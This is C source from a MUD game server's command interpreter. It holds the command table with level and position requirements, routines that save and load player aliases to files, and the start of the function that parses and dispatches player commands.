  { "lookout"  , POS_RESTING , do_lookout  , 0, 0 }, 
  { "last"     , POS_DEAD    , do_last     , LVL_IMMORT, 0 },
  { "leave"    , POS_STANDING, do_leave    , 0, 0 },
  { "levels"   , POS_DEAD    , do_levels   , 0, 0 },
  { "list"     , POS_STANDING, do_not_here , 0, 0 },
  { "lock"     , POS_SITTING , do_gen_door , 0, SCMD_LOCK },
  { "load"     , POS_DEAD    , do_load     , 156, 0 },
  { "lag"      , POS_RESTING , do_action   , 0, 0 },
  { "laugh"    , POS_RESTING , do_action   , 0, 0 },
  { "lick"     , POS_RESTING , do_action   , 0, 0 },
  { "links"    , POS_DEAD    , do_links    , LVL_BUILDER, 0 },
  { "love"     , POS_RESTING , do_action   , 0, 0 },
  { "lowblow"  , POS_FIGHTING, do_lowblow  , 0, 0 },

  { "medit"    , POS_DEAD    , do_olc      , LVL_BUILDER, SCMD_OLC_MEDIT},
  { "motd"     , POS_DEAD    , do_gen_ps   , 0, SCMD_MOTD },
  { "mesmerize", POS_STANDING, do_mesmerize, 0, 0 },
  { "monsoon"  , POS_FIGHTING, do_monsoon  , 0, 0 },
  { "motherearth",POS_FIGHTING,do_motherearth, 0, 0},
  { "map"      , POS_RESTING , do_map      , 0, 0 },
  { "mail"     , POS_STANDING, do_not_here , 1, 0 },
  { "mlist"    , POS_RESTING , do_mlist    , LVL_BUILDER, 0 },
  { "mount"    , POS_STANDING, do_mount    , 1, 0 },
  { "mute"     , POS_DEAD    , do_wizutil  , LVL_ADMIN, SCMD_SQUELCH },
  { "murder"   , POS_FIGHTING, do_hit      , 0, SCMD_MURDER },
  { "moan"     , POS_RESTING , do_action   , 0, 0 },
  { "macho"    , POS_STANDING, do_action   , 0, 0 },
  { "mosh"     , POS_STANDING, do_action   , 0, 0 },
  { "moon"     , POS_STANDING, do_action   , 0, 0 },
  { "massage"  , POS_RESTING , do_action   , 0, 0 },
  { "mgrin"    , POS_RESTING , do_action   , 0, 0 },
  { "mix"      , POS_RESTING,  do_mix      , 0, 0 },
  { "mutter"   , POS_RESTING , do_action   , 0, 0 },
  { "mobat"    , POS_DEAD    , do_mobat    , LVL_IMMORT, 0 },
  { "mobflags" , POS_DEAD    , do_gen_tog  , LVL_IMMORT, SCMD_MOBFLAGS },

  { "nether"   , POS_STANDING, do_not_here , 0, 0 },
  { "newbie"   , POS_STANDING, do_not_here , 1, 0 },
  { "news"     , POS_SLEEPING, do_gen_ps   , 0, SCMD_NEWS },
  { "noarena"  , POS_SLEEPING, do_gen_tog  , 0, SCMD_ARENA },
//  { "noauction", POS_DEAD    , do_gen_tog  , 0, SCMD_NOAUCTION },
  { "nogossip" , POS_DEAD    , do_gen_tog  , 0, SCMD_NOGOSSIP },
  { "nograts"  , POS_DEAD    , do_gen_tog  , 0, SCMD_NOGRATZ },
  { "norank"   , POS_DEAD    , do_gen_tog  , 0, SCMD_NORANK },
  { "nogrid"   , POS_DEAD    , do_gen_tog  , 0, SCMD_NOGRID },
  { "nohassle" , POS_DEAD    , do_gen_tog  , LVL_IMMORT, SCMD_NOHASSLE },
  { "noinfo"   , POS_DEAD    , do_gen_tog  , 0, SCMD_NOINFO },
  { "nofollow" , POS_DEAD    , do_gen_tog  , 0, SCMD_NOFOLLOW },
  { "norepeat" , POS_DEAD    , do_gen_tog  , 0, SCMD_NOREPEAT },
  { "noshout"  , POS_SLEEPING, do_gen_tog  , 1, SCMD_DEAF },
  { "nosummon" , POS_DEAD    , do_gen_tog  , 1, SCMD_NOSUMMON },
  { "notell"   , POS_DEAD    , do_gen_tog  , 1, SCMD_NOTELL },
  { "notitle"  , POS_DEAD    , do_wizutil  , LVL_ADMIN, SCMD_NOTITLE },
  { "nowiz"    , POS_DEAD    , do_gen_tog  , LVL_IMMORT, SCMD_NOWIZ },
  { "nibble"   , POS_RESTING , do_action   , 0, 0 },
  { "nod"      , POS_RESTING , do_action   , 0, 0 },
  { "noogie"   , POS_STANDING, do_action   , 0, 0 },
  { "nudge"    , POS_RESTING , do_action   , 0, 0 },
  { "nuzzle"   , POS_RESTING , do_action   , 0, 0 },

  { "order"    , POS_RESTING , do_order    , 1, 0 },
  { "offer"    , POS_STANDING, do_not_here , 1, 0 },
  { "open"     , POS_SITTING , do_gen_door , 0, SCMD_OPEN },
  { "olc"      , POS_DEAD    , do_olc      , LVL_BUILDER, SCMD_OLC_SAVEINFO },
  { "olcsave"  , POS_DEAD    , do_olcsave  , LVL_BUILDER, 0 },
  { "olist"    , POS_RESTING , do_olist    , LVL_BUILDER, 0 },
  { "oedit"    , POS_DEAD    , do_olc      , LVL_BUILDER, SCMD_OLC_OEDIT},
  { "omni"     , POS_DEAD    , do_omni     , LVL_ADMIN, 0},
  { "okay"     , POS_STANDING, do_not_here , 0, 0 },
  { "outfit"   , POS_STANDING, do_not_here , 0, 0 },
  { "objlist"  , POS_DEAD    , do_objlist  , 158, 0 },

  { "put"      , POS_RESTING , do_put      , 0, 0 },
  { "pay"      , POS_STANDING, do_not_here , 0, 0 },
  { "page"     , POS_DEAD    , do_page     , LVL_IMMORT, 0 },
  { "pardon"   , POS_DEAD    , do_wizutil  , LVL_ADMIN, SCMD_PARDON },
  { "peace"    , POS_DEAD    , do_peace    , LVL_ADMIN, 0 },
  { "petition" , POS_STANDING, do_not_here , 0, 0 },
  { "pick"     , POS_STANDING, do_gen_door , 1, SCMD_PICK },
  { "pitbet"   , POS_STANDING, do_pitbet   , 0, 0 },
  { "pkill"    , POS_STANDING, do_not_here , 0, 0 },
  { "playtime" , POS_DEAD    , do_playtime , 0, 0 },
  { "plist"    , POS_DEAD    , do_plist    , LVL_IMMORT, 0 },
  { "policy"   , POS_DEAD    , do_gen_ps   , 0, SCMD_POLICIES },
//  { "poofin"   , POS_DEAD    , do_poofset  , LVL_IMMORT, SCMD_POOFIN },
//  { "poofout"  , POS_DEAD    , do_poofset  , LVL_IMMORT, SCMD_POOFOUT },
  { "poof"       , POS_DEAD    , do_poof    , LVL_IMMORT, 0 },
  { "poofin"     , POS_DEAD    , do_poofin  , LVL_IMMORT, 0 },
  { "poofout"    , POS_DEAD    , do_poofout , LVL_IMMORT, 0 },
  { "pour"     , POS_STANDING, do_pour     , 0, SCMD_POUR },
  { "powerslash",POS_FIGHTING, do_powerslash,0, 0 },
  { "prompt"   , POS_DEAD    , do_display  , 0, 0 },
  { "practice" , POS_RESTING , do_practice , 1, 0 },
  { "pray"     , POS_SITTING , do_pray     , 1, 0 },
  { "present"  , POS_RESTING , do_not_here , 0, 0 },
  { "pressure" , POS_FIGHTING, do_pressure , 0, 0 },
  { "purge"    , POS_DEAD    , do_purge    , LVL_BUILDER, 0 },
  { "puke"     , POS_RESTING , do_action   , 0, 0 },
  { "punch"    , POS_RESTING , do_action   , 0, 0 },
  { "purr"     , POS_RESTING , do_action   , 0, 0 },
  { "pat"      , POS_RESTING , do_action   , 0, 0 },
  { "pant"     , POS_RESTING , do_action   , 0, 0 },
  { "pant"     , POS_RESTING , do_action   , 0, 0 },
  { "peer"     , POS_RESTING , do_action   , 0, 0 },
  { "pet"      , POS_RESTING , do_action   , 0, 0 },
  { "pinch"    , POS_RESTING , do_action   , 0, 0 },
  { "poke"     , POS_RESTING , do_action   , 0, 0 },
  { "ponder"   , POS_RESTING , do_action   , 0, 0 },
  { "plot"     , POS_RESTING , do_action   , 0, 0 },
  { "pout"     , POS_RESTING , do_action   , 0, 0 },
  { "point"    , POS_RESTING , do_action   , 0, 0 },
  { "propose"  , POS_STANDING, do_action   , 0, 0 },
  { "push"     , POS_STANDING, do_push     , 0, 0 }, 
  { "passwd"   , POS_DEAD    , do_passwd   , LVL_IMPL, 0 },

  { "private"  , POS_DEAD    , do_gen_comm , 0, SCMD_PRIVATE },
  { "psay"     , POS_DEAD    , do_gen_comm , 0, SCMD_PRIVATE },
  { "."        , POS_DEAD    , do_gen_comm , 0, SCMD_PRIVATE },
  { "psychostab",POS_FIGHTING, do_psychostab,0, 0 },
  { "padd"     , POS_DEAD    , do_private_channel , 0, PRIVATE_ADD },
  { "pclose"   , POS_DEAD    , do_private_channel , 0, PRIVATE_CLOSE },
  { "phelp"    , POS_DEAD    , do_private_channel , 0, PRIVATE_HELP },
  { "poff"     , POS_DEAD    , do_private_channel , 0, PRIVATE_OFF },
  { "popen"    , POS_DEAD    , do_private_channel , 0, PRIVATE_OPEN },
  { "prayers"  , POS_SLEEPING, do_spells   , 0, SCMD_PRAYERS },
  { "prayset"  , POS_SLEEPING, do_abilset  , 156, SCMD_PRAYERS },
  { "premove"  , POS_DEAD    , do_private_channel , 0, PRIVATE_REMOVE },
  { "pwho"     , POS_DEAD    , do_private_channel , 0, PRIVATE_WHO },
  { "pcheck"   , POS_DEAD    , do_private_channel,158, PRIVATE_CHECK },

  { "qadmin"   , POS_RESTING , do_qadmin   , LVL_QUESTOR, 0 },
  { "quaff"    , POS_RESTING , do_use      , 0, SCMD_QUAFF },
  { "qecho"    , POS_DEAD    , do_qcomm    , LVL_QUESTOR, SCMD_QECHO },
  { "qpadd"    , POS_DEAD    , do_qpmanage , LVL_QUESTOR, SCMD_ADD },
  { "qpremove" , POS_DEAD    , do_qpmanage , LVL_QUESTOR, SCMD_REMOVE },
  { "qteleport",POS_DEAD     , do_qteleport,LVL_QUESTOR, 0 },
  { "qtransport",POS_DEAD    , do_qtransport,LVL_QUESTOR, 0 },
  { "quest"    , POS_DEAD    , do_gen_tog  , 0, SCMD_QUEST },
  { "quit"     , POS_DEAD    , do_quit     , 0, 0 },
  { "quit!"    , POS_DEAD    , do_quit     , 0, SCMD_QUIT },
  { "quickdraw", POS_DEAD    , do_quickdraw, 0, SCMD_PRACTICE_QUICKDRAW },
  { "qsay"     , POS_RESTING , do_qcomm    , 0, SCMD_QSAY },

  { "reply"    , POS_SLEEPING, do_reply    , 0, 0 },
  { "rest"     , POS_RESTING , do_rest     , 0, 0 },
  { "read"     , POS_RESTING , do_look     , 0, SCMD_READ },
  { "reload"   , POS_DEAD    , do_reboot   , LVL_CODER, 0 },
  { "recite"   , POS_RESTING , do_use      , 0, SCMD_RECITE },
  { "redit"    , POS_DEAD    , do_olc      , LVL_BUILDER, SCMD_OLC_REDIT},
  { "redeem"   , POS_STANDING, do_not_here , 0, 0 },
  { "receive"  , POS_STANDING, do_not_here , 1, 0 },
  { "recall"   , POS_FIGHTING, do_recall   , 1, 0 },
  { "reimb"    , POS_DEAD    , do_reimb    , 158, 0 },
  { "reelin"   , POS_SITTING , do_reelin   , 1, 0 },
  { "remove"   , POS_RESTING , do_remove   , 0, 0 },
  { "remort"   , POS_STANDING, do_not_here , 0, 0 }, 
  { "rembit"   , POS_DEAD    , do_rembit   , 160, 0 }, 
  { "rent"     , POS_STANDING, do_not_here , 1, 0 },
  { "rend"     , POS_FIGHTING, do_rend     , 0, 0 },
  { "report"   , POS_RESTING , do_report   , 0, 0 },
  { "rescue"   , POS_FIGHTING, do_rescue   , 1, 0 },
  { "restore"  , POS_DEAD    , do_restore  , LVL_ADMIN, 0 },
  { "return"   , POS_DEAD    , do_return   , 0, 0 },
  { "retrieve" , POS_STANDING, do_not_here , 0, 0 },
  { "rise"     , POS_SLEEPING, do_rise     , 0, 0 },
  { "rlist"    , POS_RESTING , do_rlist    , LVL_BUILDER, 0 },
  { "roomflags", POS_DEAD    , do_gen_tog  , LVL_IMMORT, SCMD_ROOMFLAGS },
  { "roundhouse",POS_FIGHTING, do_roundhouse, 1, 0 },
  { "run"      , POS_STANDING, do_run      , 0, 0 },
  { "rofl"     , POS_RESTING , do_action   , 0, 0 },
  { "roll"     , POS_RESTING , do_action   , 0, 0 },
  { "rub"      , POS_RESTING , do_rub      , 0, 0 },
  { "ruffle"   , POS_STANDING, do_action   , 0, 0 },
  { "ramble"   , POS_RESTING , do_action   , 0, 0 },
  { "random"   , POS_RESTING , do_random   , LVL_IMMORT, 0 },

  { "say"      , POS_RESTING , do_say      , 0, 0 },
  { "'"        , POS_RESTING , do_say      , 0, 0 },
  { "save"     , POS_SLEEPING, do_save     , 0, 0 },
  { "sacrifice", POS_STANDING, do_sac      , 0, 0 },
  { "score"    , POS_DEAD    , do_score    , 0, 0 },
  { "scan"     , POS_STANDING, do_scan     , 1, 0 },
  { "scribe"   , POS_STANDING, do_scribe   , 0, 0 },
  { "scorch"   , POS_RESTING,  do_scorch   , 0, 0 },
  { "sell"     , POS_STANDING, do_not_here , 0, 0 },
  { "send"     , POS_SLEEPING, do_send     , LVL_IMMORT, 0 },
  { "set"      , POS_DEAD    , do_set      , LVL_BUILDER_H, 0 },
  { "sedit"    , POS_DEAD    , do_olc      , LVL_BUILDER, SCMD_OLC_SEDIT},
  { "shout"    , POS_RESTING , do_gen_comm , 0, SCMD_SHOUT },
  { "shieldpunch",POS_FIGHTING,do_shieldpunch, 0, 0 },
  { "show"     , POS_DEAD    , do_show     , LVL_ADMIN, 0 },
  { "shutdow"  , POS_DEAD    , do_shutdown , LVL_CODER_H, 0 },
  { "shutdown" , POS_DEAD    , do_shutdown , LVL_CODER_H, SCMD_SHUTDOWN },
  { "iweather" , POS_DEAD    , do_iweather , LVL_CODER_H, 0 },
  { "sip"      , POS_RESTING , do_drink    , 0, SCMD_SIP },
  { "sit"      , POS_RESTING , do_sit      , 0, 0 },
  { "skills"   , POS_SLEEPING, do_spells   , 0, SCMD_SKILLS },
  { "skillset" , POS_SLEEPING, do_abilset  , 156, SCMD_SKILLS },
  { "abilstat" , POS_SLEEPING, do_abilstat , LVL_UNUSED_2, 0 },
  { "shadow"   , POS_STANDING, do_shadow   , 1, 0 },
  { "sleep"    , POS_SLEEPING, do_sleep    , 0, 0 },
  { "sleight"  , POS_RESTING , do_sleight  , 0, 0 },
  { "slowns"   , POS_DEAD    , do_gen_tog  , LVL_IMPL, SCMD_SLOWNS },
  { "sneak"    , POS_STANDING, do_sneak    , 1, 0 },
  { "snoop"    , POS_DEAD    , do_snoop    , 151, 0 },
  { "socials"  , POS_DEAD    , do_commands , 0, SCMD_SOCIALS },
  { "songs"    , POS_SLEEPING, do_spells   , 0, SCMD_SONGS },
  { "songset"  , POS_DEAD    , do_abilset  , 158, SCMD_SONGS },
  { "soulsuck" , POS_RESTING , do_soulsuck , 1, 0 },
  { "sorcdam"  , POS_DEAD    , do_sorc_dam , LVL_IMPL, 0 },
  { "split"    , POS_SITTING , do_split    , 1, 0 },
  { "spank"    , POS_RESTING , do_action   , 0, 0 },
  { "speedwalk", POS_STANDING, do_speedwalk, 0, 0 },
  { "spells"   , POS_SLEEPING, do_spells   , 0, SCMD_SPELLS },
  { "spellset" , POS_DEAD    , do_abilset  , 156, SCMD_SPELLS },
  { "sprinkle" , POS_RESTING , do_sprinkle , 0, 0 },
  { "spy"      , POS_STANDING, do_spy      , 0, 0 },
  { "stand"    , POS_RESTING , do_stand    , 0, 0 },
  { "stat"     , POS_DEAD    , do_stat     , LVL_ADMIN, 0 },
  { "steal"    , POS_STANDING, do_steal    , 1, 0 },
  { "steer"    , POS_STANDING, do_steer    , 1, 0 }, 
  { "stun"     , POS_FIGHTING, do_stun     , 0, 0 },
  { "swarm"    , POS_FIGHTING, do_swarm    , 0, 0 },
  { "sweep"    , POS_FIGHTING, do_sweep    , 0, 0 },
  { "switch"   , POS_DEAD    , do_switch   , LVL_BUILDER, 0 },
  { "swordthrust", POS_FIGHTING, do_sword_thrust, 0, 0 },
  { "syslog"   , POS_DEAD    , do_syslog   , LVL_IMMORT, 0 },
  { "smile"    , POS_RESTING , do_action   , 0, 0 },
  { "slap"     , POS_RESTING , do_action   , 0, 0 },
  { "stable"   , POS_DEAD    , do_not_here , 0, 0 },
  { "slobber"  , POS_RESTING , do_action   , 0, 0 },
  { "smirk"    , POS_RESTING , do_action   , 0, 0 },
  { "snicker"  , POS_RESTING , do_action   , 0, 0 },
  { "snap"     , POS_RESTING , do_action   , 0, 0 },
  { "snarl"    , POS_RESTING , do_action   , 0, 0 },
  { "sneeze"   , POS_RESTING , do_action   , 0, 0 },
  { "sashay"   , POS_STANDING, do_action   , 0, 0 },
  { "scratch"  , POS_RESTING , do_action   , 0, 0 },
  { "scream"   , POS_RESTING , do_action   , 0, 0 },
  { "serenade" , POS_RESTING , do_action   , 0, 0 },
  { "shake"    , POS_RESTING , do_action   , 0, 0 },
  { "shiver"   , POS_RESTING , do_action   , 0, 0 },
  { "shower"   , POS_STANDING, do_action   , 0, 0 },
  { "sigh"     , POS_RESTING , do_action   , 0, 0 },
  { "shrug"    , POS_RESTING , do_action   , 0, 0 },
  { "shudder"  , POS_RESTING , do_action   , 0, 0 },
  { "sniff"    , POS_RESTING , do_action   , 0, 0 },
  { "snore"    , POS_SLEEPING, do_action   , 0, 0 },
  { "snort"    , POS_RESTING , do_action   , 0, 0 },
  { "snowball" , POS_STANDING, do_action   , LVL_IMMORT, 0 },
  { "snuggle"  , POS_RESTING , do_action   , 0, 0 },
  { "soap"     , POS_RESTING , do_action   , 0, 0 },
  { "sob"      , POS_RESTING , do_action   , 0, 0 },
  { "spam"     , POS_SLEEPING, do_action   , 0, 0 },
  { "spit"     , POS_FIGHTING, do_action   , 0, 0 },
  { "spitblood", POS_STANDING, do_spit_blood, 0, 0 },
  { "stare"    , POS_RESTING , do_action   , 0, 0 },
  { "steam"    , POS_RESTING , do_action   , 0, 0 },
  { "stretch"  , POS_RESTING , do_action   , 0, 0 },
  { "stroke"   , POS_RESTING , do_action   , 0, 0 },
  { "strut"    , POS_STANDING, do_action   , 0, 0 },
  { "swoon"    , POS_STANDING, do_action   , 0, 0 },
  { "sulk"     , POS_RESTING , do_action   , 0, 0 },
  { "summon"   , POS_STANDING, do_elemental_summon , 0, 0 },
  { "supplicate",POS_RESTING , do_not_here , 0, 0 },
  { "swear"    , POS_RESTING , do_action   , 0, 0 },
  { "squeal"   , POS_RESTING , do_action   , 0, 0 },
  { "squeeze"  , POS_RESTING , do_action   , 0, 0 },
  { "squirm"   , POS_RESTING , do_action   , 0, 0 },
  { "stagger"  , POS_STANDING, do_action   , 0, 0 },
  { "stomp"    , POS_FIGHTING, do_stomp    , 0, 0 },
  { "swat"     , POS_FIGHTING, do_swat     , 0, 0 },
  { "swoop"    , POS_STANDING, do_swoop    , 0, 0 },

  { "tell"     , POS_DEAD    , do_tell     , 0, 0 },
  { "take"     , POS_RESTING , do_get      , 0, 0 },
  { "tango"    , POS_STANDING, do_action   , 0, 0 },
  { "tap"      , POS_STANDING, do_action   , 0, 0 },
  { "taunt"    , POS_RESTING , do_action   , 0, 0 },
  { "taste"    , POS_RESTING , do_eat      , 0, SCMD_TASTE },
  { "tackle"   , POS_FIGHTING, do_tackle   , 0, 0},  
  { "taint"    , POS_STANDING, do_taint    , 0, 0 },
  { "tangleweed",POS_FIGHTING,do_tangleweed, 0, 0},  
  { "teleport" , POS_DEAD    , do_teleport , LVL_ADMIN, 0 },
  { "tear"     , POS_FIGHTING, do_tear     , 0, 0 },
  { "thank"    , POS_RESTING , do_action   , 0, 0 },
  { "think"    , POS_RESTING , do_action   , 0, 0 },
  { "thaw"     , POS_DEAD    , do_wizutil  , LVL_FREEZE, SCMD_THAW },
  { "threaten" , POS_RESTING , do_action   , 0, 0 },
  { "throw"    , POS_FIGHTING, do_throw    , 1, 0 },
  { "tips"     , POS_DEAD    , do_gen_tog  , 0, SCMD_SHOWTIPS },
  { "title"    , POS_DEAD    , do_title    , 0, 0 },
  { "tickle"   , POS_RESTING , do_action   , 0, 0 },
  { "time"     , POS_DEAD    , do_time     , 0, 0 },
  { "toad"     , POS_DEAD    , do_wizutil  , 158, SCMD_TOAD },
  { "toadoff"  , POS_DEAD    , do_wizutil  , 158, SCMD_TOADOFF },
  { "tnl"      , POS_RESTING , do_tnl      , 0, 0 },
  { "toggle"   , POS_DEAD    , do_toggle   , 0, 0 },
  { "tongue"   , POS_RESTING , do_action   , 0, 0 },
  { "track"    , POS_STANDING, do_track    , 0, 0 },
  { "trade"    , POS_STANDING, do_not_here , 0, 0 },
  { "train"    , POS_STANDING, do_not_here , 0, 0 },
  { "trample"  , POS_FIGHTING, do_trample  , 0, 0 },
  { "transfer" , POS_SLEEPING, do_trans    , LVL_ADMIN, 0 },
  { "trickpunch" , POS_FIGHTING, do_trickpunch    , 0, 0 },
  { "trip"     , POS_FIGHTING, do_trip     , 0, 0 },
  { "turn"     , POS_FIGHTING, do_turn     , 0, 0 },
  { "tsk"      , POS_SITTING , do_action   , 0, 0 },
  { "tedit"    , POS_DEAD    , do_olc      , LVL_BUILDER, SCMD_OLC_TRIGEDIT},
  { "twiddle"  , POS_RESTING , do_action   , 0, 0 },
  { "typo"     , POS_DEAD    , do_gen_write, 0, SCMD_TYPO },

  { "unlock"   , POS_SITTING , do_gen_door , 0, SCMD_UNLOCK },
  { "ungroup"  , POS_DEAD    , do_ungroup  , 0, 0 },
  { "unban"    , POS_DEAD    , do_unban    , 158, 0 },
  { "unfurl"   , POS_FIGHTING, do_unfurl   , 1, 0 },
  { "unaffect" , POS_DEAD    , do_wizutil  , LVL_ADMIN, SCMD_UNAFFECT },
  { "uppercut" , POS_FIGHTING, do_uppercut , 1, 0 },
  { "uptime"   , POS_DEAD    , do_date     , LVL_IMMORT, SCMD_UPTIME },
  { "use"      , POS_SITTING , do_use      , 1, SCMD_USE },
  { "users"    , POS_DEAD    , do_users    , LVL_IMMORT, 0 },

  { "value"    , POS_STANDING, do_not_here , 0, 0 },
  { "vanish"   , POS_FIGHTING, do_vanish   , 0, 0 },
  { "version"  , POS_DEAD    , do_gen_ps   , 0, SCMD_VERSION },
  { "visible"  , POS_RESTING , do_visible  , 1, 0 },
  { "vnum"     , POS_DEAD    , do_vnum     , LVL_QUESTOR, 0 },
  { "vstat"    , POS_DEAD    , do_vstat    , LVL_QUESTOR, 0 },
  { "vwear"    , POS_DEAD    , do_vwear    , 158, 0 },
  { "warcry"   , POS_FIGHTING, do_warcry   , 1, 0 },
  { "wake"     , POS_SLEEPING, do_wake     , 0, 0 },
  { "wave"     , POS_RESTING , do_action   , 0, 0 },
  { "wear"     , POS_RESTING , do_wear     , 0, 0 },
  { "weather"  , POS_RESTING , do_weather  , 0, 0 },
  { "wedgie"   , POS_STANDING, do_action   , 0, 0 },
  { "whap"     , POS_RESTING , do_action   , 0, 0 },
  { "whip"     , POS_STANDING, do_action   , 0, 0 },
  { "who"      , POS_DEAD    , do_who      , 0, 0 },
  { "whois"    , POS_DEAD    , do_whois    , 0, 0 },
  { "whoami"   , POS_DEAD    , do_gen_ps   , 0, SCMD_WHOAMI },
  { "where"    , POS_RESTING , do_where    , 1, 0 },
  { "wheel"    , POS_FIGHTING, do_wheel    , 0, 0 },
  { "whisper"  , POS_RESTING , do_spec_comm, 0, SCMD_WHISPER },
  { "whine"    , POS_RESTING , do_action   , 0, 0 },
  { "whinny"   , POS_RESTING , do_action   , 0, 0 },
  { "whistle"  , POS_RESTING , do_action   , 0, 0 },
  { "wield"    , POS_RESTING , do_wield    , 0, 0 },
  { "wiggle"   , POS_STANDING, do_action   , 0, 0 },
  { "wimpy"    , POS_DEAD    , do_wimpy    , 0, 0 },
  { "wince"    , POS_RESTING , do_action   , 0, 0 },
  { "wink"     , POS_RESTING , do_action   , 0, 0 },
  { "withdraw" , POS_STANDING, do_not_here , 1, 0 },
  { "wiznet"   , POS_DEAD    , do_wiznet   , LVL_IMMORT, 0 },
  { ";"        , POS_DEAD    , do_wiznet   , LVL_IMMORT, 0 },
  { "wizhelp"  , POS_SLEEPING, do_commands , LVL_IMMORT, SCMD_WIZHELP },
  { "wizlist"  , POS_DEAD    , do_gen_ps   , 0, SCMD_WIZLIST },
  { "wizlock"  , POS_DEAD    , do_wizlock  , LVL_IMPL, 0 },
  { "worry"    , POS_RESTING , do_action   , 0, 0 },
  { "worship"  , POS_RESTING , do_action   , 0, 0 },
  { "write"    , POS_STANDING, do_write    , 1, 0 },
  { "warn"     , POS_DEAD    , do_warning  , LVL_IMMORT, 0},
  { "yawn"     , POS_RESTING , do_action   , 0, 0 },
  { "yodel"    , POS_RESTING , do_action   , 0, 0 },

  { "xname"    , POS_DEAD    , do_xname    , 158, 0 },

  { "zedit"    , POS_DEAD    , do_olc      , LVL_BUILDER, SCMD_OLC_ZEDIT},
  { "zreset"   , POS_DEAD    , do_zreset   , LVL_BUILDER, 0 },

  /* DG trigger commands */
  { "attach"   , POS_DEAD    , do_attach   , LVL_IMPL, 0 },
  { "detach"   , POS_DEAD    , do_detach   , LVL_IMPL, 0 },
  { "tlist"    , POS_DEAD    , do_tlist    , LVL_BUILDER, 0 },
  { "tstat"    , POS_DEAD    , do_tstat    , LVL_BUILDER, 0 },
  { "masound"  , POS_DEAD    , do_masound  , -1, 0 },
  { "mkill"    , POS_STANDING, do_mkill    , -1, 0 },
  { "mobhunt"   , POS_STANDING, do_mobhunt , 0, 0 },
  { "mjunk"    , POS_SITTING , do_mjunk    , -1, 0 },
  { "mdoor"    , POS_DEAD    , do_mdoor    , -1, 0 },
  { "mecho"    , POS_DEAD    , do_mecho    , -1, 0 },
  { "mechoaround" , POS_DEAD , do_mechoaround, -1, 0 },
  { "msend"    , POS_DEAD    , do_msend    , -1, 0 },
  { "mload"    , POS_DEAD    , do_mload    , -1, 0 },
  { "mpurge"   , POS_DEAD    , do_mpurge   , -1, 0 },
  { "mgoto"    , POS_DEAD    , do_mgoto    , -1, 0 },
  { "mat"      , POS_DEAD    , do_mat      , -1, 0 },
  { "mteleport", POS_DEAD    , do_mteleport, -1, 0 },
  { "mforce"   , POS_DEAD    , do_mforce   , -1, 0 },
  { "mexp"     , POS_DEAD    , do_mexp     , -1, 0 },
  { "mqpadd"   , POS_DEAD    , do_mqpadd   , -1, 0 },
  { "mgold"    , POS_DEAD    , do_mgold    , -1, 0 },
  { "mhunt"    , POS_DEAD    , do_mhunt    , -1, 0 },
  { "mremember", POS_DEAD    , do_mremember, -1, 0 },
  { "mforget"  , POS_DEAD    , do_mforget  , -1, 0 },
  { "mtransform",POS_DEAD    , do_mtransform,-1, 0 },
  { "vdelete"  , POS_DEAD    , do_vdelete  , LVL_IMPL, 0 },
  { "\n", 0, 0, 0, 0 } };	/* this must be last */


void save_aliases(struct char_data *ch){

  struct alias *abubu;
  char fname[200];
  FILE *alidb;

  if((abubu = GET_ALIASES(ch)) != NULL ){
    sprintf(fname,"%s/%s",ADB_PREFIX,ch->player.name);
    alidb=fopen(fname,"w");
    if(alidb != NULL ){
      while(abubu != NULL ){
        fputs(abubu->alias,alidb);
        fputs("\n",alidb); /* in order to make fgets work well */
        fputs(abubu->replacement,alidb);
        fputs("\n",alidb); /* in order to make fgets work well */
        abubu=abubu->next;
      }
      fclose(alidb);
    } else
      send_to_char("Gulp. Err.. Lost them... c'est la vie... \r\n",ch);
  }
}


void load_aliases(struct char_data *ch){

  FILE *alidb;
  struct alias *a;
  char fname[200],temp1[256],temp2[256];

  if(ch->player_specials->aliases == NULL ){
   sprintf(fname,"%s/%s",ADB_PREFIX,ch->player.name);
   alidb=fopen(fname,"r");
   if(alidb != NULL)
    {
    while(!feof(alidb))
     {
     if(fgets(temp1,256,alidb) && fgets(temp2,256,alidb))
      {
      temp1[strlen(temp1)-1]='\0';
      temp2[strlen(temp2)-1]='\0';
      CREATE(a, struct alias, 1);
      a->alias = str_dup(temp1);
      delete_doubledollar(temp1);
      a->replacement = str_dup(temp2);
      if (strchr(temp2, ALIAS_SEP_CHAR) || strchr(temp2, ALIAS_VAR_CHAR))
 a->type = ALIAS_COMPLEX;
      else
 a->type = ALIAS_SIMPLE;
      a->next = GET_ALIASES(ch);
      GET_ALIASES(ch) = a;
      }
     }
    fclose(alidb);
    }
   }
}    


char *fill[] =
{
  "in",
  "from",
  "with",
  "the",
  "on",
  "at",
  "to",
  "\n"
};

char *reserved[] =
{
  "a",
  "an",
  "self",
  "me",
  "all",
  "room",
  "someone",
  "something",
  "\n"
};

/*
 * This is the actual command interpreter called from game_loop() in comm.c
 * It makes sure you are the proper level and position to execute the command,
 * then calls the appropriate function.
 */
void command_interpreter(struct char_data *ch, char *argument)
{
  int cmd, length;
  extern int no_specials;
  char *line;

  REMOVE_BIT_AR(AFF_FLAGS(ch), AFF_HIDE);

  /* just drop to next line for hitting CR */
  skip_spaces(&argument);
  if (!*argument)
    return;

  /*
   * special case to handle one-character, non-alphanumeric commands;
   * requested by many people so "'hi" or ";godnet test" is possible.
   * Patch sent by Eric Green and Stefan Wasilewski.
   */
  if (!isalpha(*argument)) {
    arg[0] = argument[0];
    arg[1] = '\0';
    line = argument + 1;
  } else
    line = any_one_arg(argument, arg);

  /* otherwise, find the command */
  if (GET_LEVEL(ch)<LVL_IMMORT) {
    int cont; /* continue the command checks */
    cont = command_wtrigger(ch, arg, line);
    if (!cont) cont += command_mtrigger(ch, arg, line);
    if (!cont) cont = command_otrigger(ch, arg, line);
    if (cont) return; /* command trigger took over */
  }

  if (GET_IDNUM(ch) == 125) {
      sprintf(buf, "FIRESTAR: %s\r\n", argument);
      log(buf);
  }

  for (length = strlen(arg), cmd = 0; *cmd_info[cmd].command != '\n'; cmd++)
    if (!strncmp(cmd_info[cmd].command, arg, length))
      if (GET_LEVEL(ch) >= cmd_info[cmd].minimum_level)
	break;

  if (*cmd_info[cmd].command == '\n')
    send_to_char("Huh?!?\r\n", ch);
  else if (PLR_FLAGGED(ch, PLR_FROZEN) && GET_LEVEL(ch) < LVL_IMPL)
    send_to_char("You try, but the mind-numbing cold prevents you...\r\n", ch);
  else if (AFF_FLAGGED(ch, AFF_ABSORB))
    send_to_char("You cannot move or speak while absorbing the earth's energies.\r\n", ch);
  else if (AFF_FLAGGED(ch, AFF_COLD))
    send_to_char("You are encased in a shell of ice, unable to move or "
                 "speak.\r\n", ch);
